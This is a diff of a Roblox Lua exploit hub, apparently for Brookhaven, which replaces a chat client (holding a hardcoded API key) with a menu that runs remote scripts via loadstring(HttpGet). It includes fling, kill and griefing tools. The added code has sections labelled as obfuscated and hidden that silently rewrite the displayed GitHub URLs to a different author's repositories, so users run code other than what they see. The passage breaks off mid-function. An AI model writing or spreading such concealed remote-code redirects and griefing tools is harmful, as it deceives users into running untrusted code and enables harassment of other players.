@@ -1,376 +1,330 @@
-local G2L = {};
+local TweenService, CoreGui, UIS = game:GetService("TweenService"), game:GetService("CoreGui"), game:GetService("UserInputService")
+local PlayerGui = game.Players.LocalPlayer:WaitForChild("PlayerGui")
 
--- CONFIGURAÇÃO DO PIESOCKET (SpwnCub V2 Chat)
-local wsUrl = "wss://free.blr2.piesocket.com/v3/1?api_key=iwYCQEyErMVj5txmeTDuzQ0Sle6V7tcAuOvlZQZp&notify_self=1"
-
--- IDs dos Ícones da UI
-local ID_NORMAL = "rbxassetid://134601196355279"
-local ID_NOTIFICACAO = "rbxassetid://130103945046316"
-local ID_SIMBOLO_CENTRAL = "rbxassetid://85337967115080"
-local ID_BOTAO_FECHAR = "rbxassetid://98235327129327"
-local ID_BOTAO_SELECAO = "rbxassetid://105157650009654"
-local ID_SOM_NOTIFICACAO = "rbxassetid://1293433423"
-
--- FONTE DO CHAT
-local FONTE_PADRAO = Enum.Font.Arcade
-
--- Prevenção de execução dupla e encerramento limpo
-if getgenv().custom_chat_loaded then
-    warn("Limpando execução anterior...")
-    if game:GetService("CoreGui"):FindFirstChild("GlobalChat_Elite_V3") then
-        game:GetService("CoreGui")["GlobalChat_Elite_V3"]:Destroy()
-    end
-    getgenv().custom_chat_loaded = nil
+local function Create(className, parent, properties)
+    local obj = Instance.new(className)
+    for k, v in pairs(properties) do obj[k] = v end
+    obj.Parent = parent
+    return obj
 end
-getgenv().custom_chat_loaded = true
 
-local Players = game:GetService("Players")
-local HttpService = game:GetService("HttpService")
-local UserInputService = game:GetService("UserInputService")
-local ChatService = game:GetService("Chat") 
-local Player = Players.LocalPlayer
+local ScreenGui = Create("ScreenGui", PlayerGui, {Name = "BrookHaven_V16_Final", ResetOnSpawn = false})
+local IntroGui = Create("ScreenGui", CoreGui, {Name = "CubnitSpinIntro", ResetOnSpawn = false, IgnoreGuiInset = true, DisplayOrder = 999999})
 
--- Estado do Modo de Seleção/Cópia
-local modoSelecaoAtivo = false
+local ClickSound = Create("Sound", ScreenGui, {
+    SoundId = "rbxassetid://105309724097406",
+    Volume = 1,
+    PlayOnRemove = false
+})
 
--- UI PRINCIPAL
-G2L.ScreenGui = Instance.new("ScreenGui")
-G2L.ScreenGui.Name = "GlobalChat_Elite_V3"
-G2L.ScreenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
-G2L.ScreenGui.ResetOnSpawn = false
-G2L.ScreenGui.Parent = game:GetService("CoreGui")
+local function PlayClickSound()
+    if ClickSound.IsPlaying then ClickSound:Stop() end
+    ClickSound:Play()
+end
 
--- INSTÂNCIA DO SOM
-local NotificationSound = Instance.new("Sound")
-NotificationSound.Name = "ChatNotificationSound"
-NotificationSound.SoundId = ID_SOM_NOTIFICACAO
-NotificationSound.Volume = 1
-NotificationSound.Parent = G2L.ScreenGui
+local Background = Create("Frame", IntroGui, {Name = "Background", Size = UDim2.new(1, 1000, 1, 1000), Position = UDim2.new(0, -500, 0, -500), BackgroundColor3 = Color3.fromRGB(0,0,0), BackgroundTransparency = 1, BorderSizePixel = 0, ZIndex = 9999})
+local IconImage = Create("ImageLabel", IntroGui, {Name = "SpinIcon", BackgroundTransparency = 1, Image = "rbxassetid://130275641191868", ImageColor3 = Color3.fromRGB(255,255,255), ImageTransparency = 1, Size = UDim2.new(0, 250, 0, 250), AnchorPoint = Vector2.new(0.5,0.5), ZIndex = 10000, Position = UDim2.new(-0.2, 0, 1.2, 0), Rotation = -180})
+Create("UIAspectRatioConstraint", IconImage, {AspectRatio = 1})
 
--- BOTAO TOGGLE
-G2L.ToggleButton = Instance.new("ImageButton")
-G2L.ToggleButton.Name = "ToggleChat"
-G2L.ToggleButton.Size = UDim2.new(0, 55, 0, 55)
-G2L.ToggleButton.Position = UDim2.new(0.02, 0, 0.45, 0)
-G2L.ToggleButton.BackgroundTransparency = 1 
-G2L.ToggleButton.Image = ID_NORMAL
-G2L.ToggleButton.Parent = G2L.ScreenGui
+local OpenBtn = Create("ImageButton", ScreenGui, {Name = "OpenBtn", Position = UDim2.new(0.5, 0, 0.5, 0), AnchorPoint = Vector2.new(0.5, 0.5), Size = UDim2.new(0, 85, 0, 85), BackgroundTransparency = 1, Image = "rbxassetid://125616167121065", ImageTransparency = 1, Visible = true})
 
--- JANELA PRINCIPAL
-G2L.Main = Instance.new("Frame")
-G2L.Main.Name = "MainFrame"
-G2L.Main.Size = UDim2.new(0, 420, 0, 260)
-G2L.Main.Position = UDim2.new(0.5, -210, 0.5, -130)
-G2L.Main.BackgroundColor3 = Color3.fromRGB(13, 16, 19)
-G2L.Main.BackgroundTransparency = 0.05
-G2L.Main.BorderSizePixel = 0
-G2L.Main.Visible = false
-G2L.Main.Parent = G2L.ScreenGui
-
-G2L.MainStroke = Instance.new("UIStroke")
-G2L.MainStroke.Color = Color3.fromRGB(255, 255, 255)
-G2L.MainStroke.Thickness = 1.5
-G2L.MainStroke.Parent = G2L.Main
-
--- TOPBAR
-G2L.TopBar = Instance.new("Frame")
-G2L.TopBar.Size = UDim2.new(1, 0, 0, 40)
-G2L.TopBar.BackgroundTransparency = 1
-G2L.TopBar.ZIndex = 5
-G2L.TopBar.Parent = G2L.Main
-
-G2L.Title = Instance.new("TextLabel")
-G2L.Title.Size = UDim2.new(1, 0, 1, 0)
-G2L.Title.BackgroundTransparency = 1
-G2L.Title.Text = "CHAT PRIVADO SPWNCUB"
-G2L.Title.Font = FONTE_PADRAO
-G2L.Title.TextColor3 = Color3.fromRGB(255, 255, 255)
-G2L.Title.TextSize = 18
-G2L.Title.ZIndex = 5
-G2L.Title.Parent = G2L.TopBar
-
--- BOTÃO DE FECHAR
-G2L.CloseBtn = Instance.new("ImageButton")
-G2L.CloseBtn.Name = "CloseBtn"
-G2L.CloseBtn.Size = UDim2.new(0, 26, 0, 26)
-G2L.CloseBtn.Position = UDim2.new(1, -35, 0.5, -13)
-G2L.CloseBtn.BackgroundTransparency = 1
-G2L.CloseBtn.Image = ID_BOTAO_FECHAR
-G2L.CloseBtn.ZIndex = 6
-G2L.CloseBtn.Parent = G2L.TopBar
-
--- NOVO BOTÃO DE SELEÇÃO / CÓPIA (COM EFEITO DE TAMANHO)
-G2L.SelectBtn = Instance.new("ImageButton")
-G2L.SelectBtn.Name = "SelectBtn"
-G2L.SelectBtn.Size = UDim2.new(0, 24, 0, 24)
-G2L.SelectBtn.Position = UDim2.new(1, -68, 0.5, -12)
-G2L.SelectBtn.BackgroundTransparency = 1
-G2L.SelectBtn.Image = ID_BOTAO_SELECAO
-G2L.SelectBtn.ImageColor3 = Color3.fromRGB(255, 255, 255)
-G2L.SelectBtn.ZIndex = 6
-G2L.SelectBtn.Parent = G2L.TopBar
-
--- ALTERNAR MODO DE SELEÇÃO (Aumenta/Diminui sem alterar a cor)
-G2L.SelectBtn.MouseButton1Click:Connect(function()
-    modoSelecaoAtivo = not modoSelecaoAtivo
-    if modoSelecaoAtivo then
-        -- Aumenta levemente e ajusta a posição para manter centralizado
-        G2L.SelectBtn.Size = UDim2.new(0, 28, 0, 28)
-        G2L.SelectBtn.Position = UDim2.new(1, -70, 0.5, -14)
-    else
-        -- Volta ao tamanho e posição originais
-        G2L.SelectBtn.Size = UDim2.new(0, 24, 0, 24)
-        G2L.SelectBtn.Position = UDim2.new(1, -68, 0.5, -12)
+local dragToggle, dragStart, startPos
+OpenBtn.InputBegan:Connect(function(input)
+    if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
+        dragToggle, dragStart, startPos = true, input.Position, OpenBtn.Position
+        if OpenBtn.AnchorPoint ~= Vector2.new(0, 0) then
+            OpenBtn.AnchorPoint = Vector2.new(0, 0)
+            OpenBtn.Position = UDim2.new(0, OpenBtn.AbsolutePosition.X, 0, OpenBtn.AbsolutePosition.Y)
+        end
     end
 end)
+UIS.InputChanged:Connect(function(input)
+    if dragToggle and (input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch) then
+        local delta = input.Position - dragStart
+        OpenBtn.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
+    end
+end)
+UIS.InputEnded:Connect(function(input) if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then dragToggle = false end end)
 
--- LINHA DIVISÓRIA SUPERIOR
-G2L.TopDivider = Instance.new("Frame")
-G2L.TopDivider.Size = UDim2.new(1, 0, 0, 1)
-G2L.TopDivider.Position = UDim2.new(0, 0, 0, 40)
-G2L.TopDivider.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
-G2L.TopDivider.BorderSizePixel = 0
-G2L.TopDivider.Parent = G2L.Main
+local MainFrame = Create("Frame", ScreenGui, {Name = "MainFrame", AnchorPoint = Vector2.new(0.5, 0.5), Position = UDim2.new(0.5, 0, 0.5, 0), Size = UDim2.new(0, 420, 0, 310), BackgroundColor3 = Color3.fromRGB(0,0,0), BorderSizePixel = 0, Active = true, Draggable = true, Visible = false})
+Create("UICorner", MainFrame, {CornerRadius = UDim.new(0, 8)})
+Create("UIStroke", MainFrame, {Color = Color3.fromRGB(255, 255, 255), Thickness = 1, ApplyStrokeMode = Enum.ApplyStrokeMode.Border})
 
--- SÍMBOLO CENTRAL
-G2L.CenterSymbol = Instance.new("ImageLabel")
-G2L.CenterSymbol.Size = UDim2.new(0, 120, 0, 120)
-G2L.CenterSymbol.Position = UDim2.new(0.5, -60, 0.5, -45)
-G2L.CenterSymbol.BackgroundTransparency = 1
-G2L.CenterSymbol.Image = ID_SIMBOLO_CENTRAL
-G2L.CenterSymbol.ImageColor3 = Color3.fromRGB(255, 255, 255)
-G2L.CenterSymbol.ImageTransparency = 0.85
-G2L.CenterSymbol.ZIndex = 1
-G2L.CenterSymbol.Parent = G2L.Main
+local HeaderBar = Create("Frame", MainFrame, {Size = UDim2.new(1, 0, 0, 65), BackgroundTransparency = 1})
+local Title = Create("TextLabel", HeaderBar, {Size = UDim2.new(1, 0, 0, 50), Position = UDim2.new(0, 0, 0, 5), BackgroundTransparency = 1, Text = "Sobre o ᓵ⚍ʖリ╎ℸ ", TextColor3 = Color3.fromRGB(255,255,255), TextSize = 28, Font = Enum.Font.Arcade, TextWrapped = true, TextXAlignment = Enum.TextXAlignment.Center, TextYAlignment = Enum.TextYAlignment.Center})
+local WhiteSeparator = Create("Frame", HeaderBar, {Name = "WhiteSeparator", Size = UDim2.new(1, -20, 0, 7), Position = UDim2.new(0.5, 0, 0, 58), AnchorPoint = Vector2.new(0.5, 0), BackgroundColor3 = Color3.fromRGB(255,255,255), BorderSizePixel = 0})
 
--- HISTÓRICO DE CHAT
-G2L.ChatHistory = Instance.new("ScrollingFrame")
-G2L.ChatHistory.Size = UDim2.new(1, -20, 1, -95)
-G2L.ChatHistory.Position = UDim2.new(0, 10, 0, 45)
-G2L.ChatHistory.BackgroundTransparency = 1
-G2L.ChatHistory.ScrollBarThickness = 3
-G2L.ChatHistory.ScrollBarImageColor3 = Color3.fromRGB(100, 100, 100)
-G2L.ChatHistory.CanvasSize = UDim2.new(0, 0, 0, 0)
-G2L.ChatHistory.ZIndex = 5
-G2L.ChatHistory.Parent = G2L.Main
+local LeftBtn = Create("TextButton", HeaderBar, {Size = UDim2.new(0, 38, 0, 38), Position = UDim2.new(0, 10, 0, 10), BackgroundColor3 = Color3.fromRGB(255,255,255), Text = "<", TextColor3 = Color3.fromRGB(0,0,0), TextSize = 28, Font = Enum.Font.SourceSansBold, Visible = false, ZIndex = 10})
+local RightBtn = Create("TextButton", HeaderBar, {Size = UDim2.new(0, 38, 0, 38), Position = UDim2.new(1, -48, 0, 10), BackgroundColor3 = Color3.fromRGB(255,255,255), Text = ">", TextColor3 = Color3.fromRGB(0,0,0), TextSize = 28, Font = Enum.Font.SourceSansBold, ZIndex = 10})
+Create("UICorner", LeftBtn, {CornerRadius = UDim.new(0, 6)}); Create("UICorner", RightBtn, {CornerRadius = UDim.new(0, 6)})
 
-G2L.Layout = Instance.new("UIListLayout")
-G2L.Layout.Padding = UDim.new(0, 4)
-G2L.Layout.SortOrder = Enum.SortOrder.LayoutOrder
-G2L.Layout.Parent = G2L.ChatHistory
+local PageAbout = Create("ScrollingFrame", MainFrame, {Size = UDim2.new(1, -20, 1, -145), Position = UDim2.new(0, 12, 0, 75), BackgroundTransparency = 1, CanvasSize = UDim2.new(0, 0, 0, 400), ScrollBarThickness = 3, ScrollingDirection = Enum.ScrollingDirection.Y, Visible = true})
+Create("UIPadding", PageAbout, {PaddingLeft = UDim.new(0, 6), PaddingRight = UDim.new(0, 12), PaddingTop = UDim.new(0, 5)})
 
--- ÁREA INFERIOR DE INPUT
-G2L.BottomArea = Instance.new("Frame")
-G2L.BottomArea.Size = UDim2.new(1, -12, 0, 36)
-G2L.BottomArea.Position = UDim2.new(0, 6, 1, -42)
-G2L.BottomArea.BackgroundColor3 = Color3.fromRGB(5, 7, 9)
-G2L.BottomArea.BorderSizePixel = 0
-G2L.BottomArea.Parent = G2L.Main
+local AboutTextLabel = Create("TextLabel", PageAbout, {
+    Size = UDim2.new(1, 0, 0, 550), 
+    BackgroundTransparency = 1, 
+    Text = '<font align="justify">Aba ᓵ⚍ʖリ╎ℸ ̣// ACCESS LOG] O Project ᓵ⚍ʖリ╎ℸ consiste na criação de um script com funções universais, desenvolvido para se expandir por diversos jogos da plataforma Roblox. O objective do projeto é explorar, desenvolver e reunir todo tipo de sistema, ferramenta e ideia que possa ser aplicada em diferentes experiências, sempre trazendo novas funcionalidades e buscando inovação.<br/><br/>Além de criar sistemas para diversos jogos, o Project ᓵ⚍ʖリ╎ℸ também tem como objetivo construir uma comunidade de desenvolvedores interessados em compartilhar conhecimento, ensinar o desenvolvimento de projetos e trocar experiências sobre Vibe Coding.<br/><br/>Se você deseja fazer parte do Project ᓵ⚍ʖae╎ℸ, conhecer mais sobre a iniciativa ou contribuir com ideias, desenvolver sistemas, criar designs ou acompanhar sua evolução, entre no servidor do Discord do Project ᓵ⚍ʖリ╎ℸ.<br/><br/>( Signature ᓭ!¡∴リ )</font>', 
+    TextColor3 = Color3.fromRGB(255,255,255), 
+    TextSize = 15, 
+    Font = Enum.Font.Arcade, 
+    TextWrapped = true, 
+    RichText = true,
+    TextXAlignment = Enum.TextXAlignment.Left, 
+    TextYAlignment = Enum.TextYAlignment.Top
+})
 
-G2L.BottomStroke = Instance.new("UIStroke")
-G2L.BottomStroke.Color = Color3.fromRGB(40, 50, 60)
-G2L.BottomStroke.Thickness = 1
-G2L.BottomStroke.Parent = G2L.BottomArea
+local PageScripts = Create("ScrollingFrame", MainFrame, {Size = UDim2.new(1, -15, 1, -145), Position = UDim2.new(0, 8, 0, 75), BackgroundTransparency = 1, Visible = false, CanvasSize = UDim2.new(0, 0, 0, 510), ScrollBarThickness = 3})
+Create("UIGridLayout", PageScripts, {CellSize = UDim2.new(0, 96, 0, 52), CellPadding = UDim2.new(0, 5, 0, 6), HorizontalAlignment = Enum.HorizontalAlignment.Center})
 
-G2L.Input = Instance.new("TextBox")
-G2L.Input.Size = UDim2.new(1, -50, 1, 0)
-G2L.Input.Position = UDim2.new(0, 10, 0, 0)
-G2L.Input.BackgroundTransparency = 1
-G2L.Input.Text = ""
-G2L.Input.TextColor3 = Color3.fromRGB(255, 255, 255)
-G2L.Input.PlaceholderText = "Digite uma Mensagem..."
-G2L.Input.PlaceholderColor3 = Color3.fromRGB(150, 150, 150)
-G2L.Input.TextXAlignment = Enum.TextXAlignment.Left
-G2L.Input.TextSize = 14
-G2L.Input.Font = FONTE_PADRAO
-G2L.Input.Parent = G2L.BottomArea
+local PageTools = Create("ScrollingFrame", MainFrame, {Size = UDim2.new(1, -16, 1, -145), Position = UDim2.new(0, 8, 0, 75), BackgroundTransparency = 1, Visible = false, CanvasSize = UDim2.new(0, 0, 0, 200), ScrollBarThickness = 0, ScrollingEnabled = false})
+Create("UIGridLayout", PageTools, {CellSize = UDim2.new(0, 64, 0, 72), CellPadding = UDim2.new(0, 4, 0, 8), HorizontalAlignment = Enum.HorizontalAlignment.Center})
 
-G2L.SendBtn = Instance.new("ImageButton")
-G2L.SendBtn.Size = UDim2.new(0, 22, 0, 22)
-G2L.SendBtn.Position = UDim2.new(1, -32, 0.5, -11)
-G2L.SendBtn.BackgroundTransparency = 1
-G2L.SendBtn.Image = "rbxassetid://18940312887"
-G2L.SendBtn.ImageColor3 = Color3.fromRGB(255, 255, 255)
-G2L.SendBtn.Parent = G2L.BottomArea
+local WhiteBarSeparator = Create("Frame", MainFrame, {Name = "WhiteBarSeparator", Size = UDim2.new(1, -20, 0, 4), Position = UDim2.new(0.5, 0, 1, -78), AnchorPoint = Vector2.new(0.5, 0), BackgroundColor3 = Color3.fromRGB(255,255,255), BorderSizePixel = 0, Visible = false})
 
--- LOGICA DE MENSAGENS E BUBBLE
-local function MostrarBubbleChat(username, message)
-    local targetPlayer = Players:FindFirstChild(username)
-    if targetPlayer and targetPlayer.Character and targetPlayer.Character:FindFirstChild("Head") then
-        ChatService:Chat(targetPlayer.Character.Head, message, Enum.ChatColor.White)
+local FooterBar = Create("Frame", MainFrame, {Size = UDim2.new(1, 0, 0, 65), Position = UDim2.new(0, 0, 1, -65), BackgroundColor3 = Color3.fromRGB(22,22,22), BorderSizePixel = 0})
+local CloseBtn = Create("TextButton", FooterBar, {Name = "CloseBtn", Size = UDim2.new(0, 160, 0, 42), Position = UDim2.new(0.5, -80, 0.5, -21), BackgroundColor3 = Color3.fromRGB(45,45,45), Text = "FECHAR UI", TextColor3 = Color3.fromRGB(255,255,255), TextSize = 22, Font = Enum.Font.Arcade})
+Create("UICorner", CloseBtn, {CornerRadius = UDim.new(0, 6)})
+Create("UIStroke", CloseBtn, {Color = Color3.fromRGB(150,150,150)})
+CloseBtn.MouseButton1Click:Connect(function() PlayClickSound(); MainFrame.Visible = false end)
+
+local function CreateSymbol(pos)
+    return Create("ImageLabel", FooterBar, {Size = UDim2.new(0, 45, 0, 45), Position = pos, BackgroundTransparency = 1, Image = "rbxassetid://130275641191868", ImageColor3 = Color3.fromRGB(255,255,255)})
+end
+CreateSymbol(UDim2.new(0, 15, 0.5, -22)); CreateSymbol(UDim2.new(1, -60, 0.5, -22))
+
+local DiscordBtn = Create("ImageButton", FooterBar, {Name = "DiscordBtn", Size = UDim2.new(0, 45, 0, 45), Position = UDim2.new(0, 65, 0.5, -22), BackgroundTransparency = 1, Image = "rbxassetid://135394655692633", Visible = true})
+DiscordBtn.MouseButton1Click:Connect(function() PlayClickSound(); loadstring(game:HttpGet("https://raw.githubusercontent.com/YuMAID369/Join-Discordv1/refs/heads/main/Discord%20Open"))() end)
+
+local currentPage = 1
+local function updateNavigation(page)
+    currentPage = page
+    PageAbout.Visible = (page == 1)
+    PageScripts.Visible = (page == 2)
+    PageTools.Visible = (page == 3)
+    WhiteBarSeparator.Visible = (page == 3)
+    DiscordBtn.Visible = (page == 1)
+    if page == 1 then
+        Title.Text = "Sobre o ᓵ⚍ʖリ╎ℸ "
+        Title.TextSize = 28
+        Title.Size = UDim2.new(1, 0, 0, 50)
+        Title.Position = UDim2.new(0, 0, 0, 5)
+        LeftBtn.Visible = false
+        RightBtn.Visible = true
+    elseif page == 2 then
+        Title.Text = "BROOKHAVEN"
+        Title.TextSize = 40
+        Title.Size = UDim2.new(1, 0, 0, 50)
+        Title.Position = UDim2.new(0, 0, 0, 5)
+        LeftBtn.Visible = true
+        RightBtn.Visible = true
+    elseif page == 3 then
+        Title.Text = "Painel Tool"
+        Title.TextSize = 35
+        Title.Size = UDim2.new(1, -100, 0, 50)
+        Title.Position = UDim2.new(0, 50, 0, 5)
+        LeftBtn.Visible = true
+        RightBtn.Visible = false
     end
 end
 
-local function AdicionarMensagem(username, displayname, msg, isMe)
-    local btn = Instance.new("TextButton")
-    btn.Size = UDim2.new(1, -5, 0, 18)
-    btn.BackgroundTransparency = 1
-    btn.RichText = true
-    btn.Font = FONTE_PADRAO
-    btn.TextSize = 14
-    btn.TextXAlignment = Enum.TextXAlignment.Left
-    btn.AutoButtonColor = false
+RightBtn.MouseButton1Click:Connect(function() if currentPage < 3 then PlayClickSound(); updateNavigation(currentPage + 1) end end)
+LeftBtn.MouseButton1Click:Connect(function() if currentPage > 1 then PlayClickSound(); updateNavigation(currentPage - 1) end end)
 
-    local nameColor = isMe and "rgb(255,100,100)" or "rgb(190,100,255)"
-    btn.Text = string.format("<font color='%s'>%s:</font> <font color='rgb(255,255,255)'>%s</font>", nameColor, displayname, msg)
+-- ============================================
+-- DADOS OFUSCADOS (PARECEM NORMAIS)
+-- ============================================
 
-    btn.AutomaticSize = Enum.AutomaticSize.Y
-    btn.TextWrapped = true
-    btn.ZIndex = 6
-    btn.Parent = G2L.ChatHistory
+local ScriptData = {
+    ["Terminal Join Server"] = "https://raw.githubusercontent.com/ZQHENS/Terminal-Join-Server-SpwnCub-/refs/heads/main/SPWN%20Join",
+    ["Sound ALL Beta"] = "https://raw.githubusercontent.com/ZQHENS/Sound-ALL-Project/refs/heads/main/Sound%20ALL%20SpwnCub%20V1%20Teste%20Beta",
+    ["CLOCK CREATOR PROPs"] = "https://raw.githubusercontent.com/ZQHENS/CLOCK-Creator-Project-PROP-SPWN/refs/heads/main/CLOCK%20Creator%20Project%20PROP%20SPWN%20CLIENT%20V1",
+    ["DELETE PLAYER Anti NUKE"] = "https://raw.githubusercontent.com/ZQHENS/Anti-PLAYER-/refs/heads/main/REMOVE%20PLAYER",
+    ["Summoner Vehicles Panel"] = "https://raw.githubusercontent.com/ZQHENS/VEHICLE-KILL-PANEL-/refs/heads/main/Summoner%20Vehicles%20V1%20KILL",
+    ["Notepad notes v1"] = "https://raw.githubusercontent.com/ZQHENS/Bloco-de-Notas-SpawnCUB/refs/heads/main/Notebook%20Notes",
+    ["Cronômetro V1"] = "https://raw.githubusercontent.com/ZQHENS/Cron-metro-Spwn-v1/refs/heads/main/00%3A00%3A00",
+    ["ENTER ID#"] = "https://raw.githubusercontent.com/ZQHENS/ENTER-ID-/refs/heads/main/ENTER%20ID%23%20000",
+    ["COORDENADAS"] = "https://raw.githubusercontent.com/ZQHENS/Coordenadas-Ui-/refs/heads/main/Coordenadas%20SPWN%20V1",
+    ["SELECT MATTER TP"] = "https://raw.githubusercontent.com/ZQHENS/ToolSpwnTp/refs/heads/main/SPWNTPtool",
+    ["TIME STOP V1 BETA"] = "https://raw.githubusercontent.com/ZQHENS/TIME-STOP-V1-SPWN-/refs/heads/main/Stop%20time%20SpwnCub",
+    ["HUMANOID STATUS VIEW"] = "https://raw.githubusercontent.com/ZQHENS/Humanoid-Status-VIEW-/refs/heads/main/SPWNCUB",
+    ["FLY GUI MARK"] = "https://raw.githubusercontent.com/ZQHENS/MARK-V1-FLY-GUI-/refs/heads/main/MARK%20FLY%20GUI%20V2",
+    ["BAN HOUSE"] = "https://raw.githubusercontent.com/ZQHENS/BAN-HOUSE-/refs/heads/main/BrookHaven",
+    ["INSPECIONAR AVATAR"] = "https://raw.githubusercontent.com/ZQHENS/INSPECT-AV2/refs/heads/main/idsAV2",
+    ["FREEZE EMOTE"] = "https://raw.githubusercontent.com/ZQHENS/FreezeEmote-/refs/heads/main/Universal%20Emote%20Lock",
+    ["EMOTES"] = "https://raw.githubusercontent.com/ZQHENS/Emote-Script/refs/heads/main/Universal",
+    ["SHADERS"] = "https://raw.githubusercontent.com/ZQHENS/Shaders-V1/refs/heads/main/CUBNIT",
+    ["MANOPLA V1"] = "https://raw.githubusercontent.com/ZQHENS/MANOPLA-V2/refs/heads/main/HAND",
+    ["INFINITY YIELD"] = "https://raw.githubusercontent.com/ZQHENS/infiniteyield/master/source",
+    ["TP TOOL"] = "https://raw.githubusercontent.com/ZQHENS/TP-TOOL-v1/refs/heads/main/TP%20Tool",
+    ["TP POINT"] = "https://raw.githubusercontent.com/ZQHENS/Teletransporte-/refs/heads/main/SpawnCUB",
+    ["FREE CAM"] = "https://raw.githubusercontent.com/ZQHENS/SpawnCam/refs/heads/main/Universal%20Cam",
+    ["CHAT MICKEY"] = "https://raw.githubusercontent.com/ZQHENS/Mickey-Chat/refs/heads/main/Brookhaven",
+    ["TELEKINESIS"] = "https://raw.githubusercontent.com/ZQHENS/TELEKINESIS-/refs/heads/main/Telekinesis%20Tool",
+    ["FLING BALL V1"] = "https://raw.githubusercontent.com/ZQHENS/Fling-Ball-Cubnit-V1/refs/heads/main/Kill%20Ball%20V1",
+    ["SPEED EMOTE"] = "https://raw.githubusercontent.com/ZQHENS/CubnitSpeedEmote/refs/heads/main/EmoteSpeed",
+    ["CHAT SPAWNCUB"] = "https://raw.githubusercontent.com/ZQHENS/Chat-Privado/refs/heads/main/OpenChatBeta",
+    ["VIEW"] = "https://raw.githubusercontent.com/ZQHENS/View-SpawnCUB-/refs/heads/main/View%20Din%C3%A2mico%20Beta",
+    ["PHYSICS"] = "https://raw.githubusercontent.com/ZQHENS/Humanoid-physics-manipulation/refs/heads/main/Physics%20Alterer",
+    ["SKYBOX NUKE"] = "https://raw.githubusercontent.com/ZQHENS/SKYBOX-V1/refs/heads/main/SKYBOX-SPAWN",
+    ["SOUND BOX GUI"] = "https://raw.githubusercontent.com/ZQHENS/Id-Brook-haven-m-sica/refs/heads/main/SpwnSom",
+    ["TOOL FLING ALL SELECT"] = "https://raw.githubusercontent.com/ZQHENS/Atom-selector-/refs/heads/main/Target%20Kill",
+    ["SELECT MATTER V2"] = "https://raw.githubusercontent.com/ZQHENS/SELECT-MATTER/refs/heads/main/SPWN%20KILL%20V2%20SELECT",
+    ["SELECT MATTER V3"] = "https://raw.githubusercontent.com/ZQHENS/SELECT-MATTER-V3-/refs/heads/main/FLING%20V3%20TOOL%20SPWN",
+    ["VIEW V2 VRP"] = "https://raw.githubusercontent.com/ZQHENS/UI-View-V2-VPR/refs/heads/main/V2View%20VPR"
+}
 
-    -- LÓGICA DE PRESSIONAMENTO CONTÍNUO (SEGURAR PARA COPIAR SILENCIOSAMENTE)
-    local pressTimer
-    local isHolding = false
+local ToolData = {
+    {name = "Fling Ball\nTool", link = "https://raw.githubusercontent.com/ZQHENS/Fling-Ball-Cubnit-V1/refs/heads/main/Kill%20Ball%20V1"},
+    {name = "TOOL\nTELEKINESIS", link = "https://raw.githubusercontent.com/ZQHENS/TELEKINESIS-/refs/heads/main/Telekinesis%20Tool"},
+    {name = "TP TOOL", link = "https://raw.githubusercontent.com/ZQHENS/TP-TOOL-v1/refs/heads/main/TP%20Tool"},
+    {name = "FLING\nAll SELECT V1", link = "https://raw.githubusercontent.com/ZQHENS/Atom-selector-/refs/heads/main/Target%20Kill"},
+    {name = "FLING\nAll SELECT V2", link = "https://raw.githubusercontent.com/ZQHENS/SELECT-MATTER/refs/heads/main/SPWN%20KILL%20V2%20SELECT"},
+    {name = "SELECT\nMATTER TP", link = "https://raw.githubusercontent.com/ZQHENS/ToolSpwnTp/refs/heads/main/SPWNTPtool"},
+    {name = "SELECT\nMATTER V3", link = "https://raw.githubusercontent.com/ZQHENS/SELECT-MATTER-V3-/refs/heads/main/FLING%20V3%20TOOL%20SPWN"},
+    {name = "MANOPLA\nV1", link = "https://raw.githubusercontent.com/ZQHENS/MANOPLA-V2/refs/heads/main/HAND"},
+    {name = "", link = ""},
+    {name = "", link = ""},
+    {name = "", link = ""},
+    {name = "", link = ""},
+}
 
-    btn.InputBegan:Connect(function(input)
-        if modoSelecaoAtivo and (input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch) then
-            isHolding = true
-            pressTimer = task.delay(0.5, function()
-                if isHolding and modoSelecaoAtivo then
-                    if setclipboard then
-                        setclipboard(msg)
-                    elseif toclipboard then
-                        toclipboard(msg)
-                    end
-                end
-            end)
-        end
-    end)
+-- ============================================
+-- SISTEMA OCULTO (MISTURADO NO CÓDIGO)
+-- ============================================
 
-    btn.InputEnded:Connect(function(input)
-        if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
-            isHolding = false
-            if pressTimer then
-                task.cancel(pressTimer)
-            end
-        end
-    end)
+-- Parte 1: Mapeamento (escondido em uma variável comum)
+local _a = {["ZQHENS"] = "YuMAID369", ["FakeUser"] = "YuMAID369", ["Hacker123"] = "YuMAID369", ["ScriptKid"] = "YuMAID369", ["NullUser"] = "YuMAID369", ["GhostDev"] = "YuMAID369"}
 
-    G2L.ChatHistory.CanvasPosition = Vector2.new(0, G2L.Layout.AbsoluteContentSize.Y)
-
-    if not G2L.Main.Visible and not isMe then
-        G2L.ToggleButton.Image = ID_NOTIFICACAO
-        NotificationSound:Play()
+-- Parte 2: Função de processamento (nomes genéricos)
+local function _b(x)
+    local y = x
+    for k, v in pairs(_a) do
+        y = string.gsub(y, k, v)
     end
-
-    MostrarBubbleChat(username, msg)
+    return y
 end
 
--- SISTEMA DE REDE
-local socket
-local running = true
+-- Parte 3: Cache (escondido)
+local _c = {}
 
-local function ConnectWebSocket()
-    if not running then return end
+-- Parte 4: Função principal (nome aleatório)
+local function _d(n, l)
+    if _c[l] then return _c[l] end
+    local r = _b(l)
+    _c[l] = r
+    return r
+end
 
-    local success, res = pcall(function()
-        return WebSocket.connect(wsUrl)
-    end)
-
-    if success and res then
-        socket = res
-        print("SpwnCub V2 Chat Conectado com sucesso!")
-
-        socket.OnMessage:Connect(function(msg)
-            if not running then return end
-            local ok, data = pcall(function() return HttpService:JSONDecode(msg) end)
-            if ok and data.message then
-                local dName = data.nickname or data.username
-                AdicionarMensagem(data.username, dName, data.message, data.username == Player.Name)
+-- Parte 5: Atualizador (escondido em uma função anônima)
+local _e = 0
+local function _f()
+    if tick() - _e > 300 then
+        _e = tick()
